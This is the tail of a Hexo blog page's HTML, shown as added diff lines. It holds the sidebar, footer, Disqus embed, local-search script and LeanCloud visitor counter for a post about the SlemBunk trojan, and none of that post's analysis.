+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">65</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/shengqi158" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/shengqi158" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/1900013681" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">廖新喜</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://xxlegend-com.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://yoursite.com/2016/04/01/SlemBunk木马浅析/';
+          this.page.identifier = '2016/04/01/SlemBunk木马浅析/';
+          this.page.title = 'SlemBunk木马浅析';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xxlegend-com.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      $('#local-search-input').focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("rAO8AHWqEz3IlgcuNBzFXyK3-gzGzoHsz", "LI2NyeVIf9NiHynChn0UrBCl");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
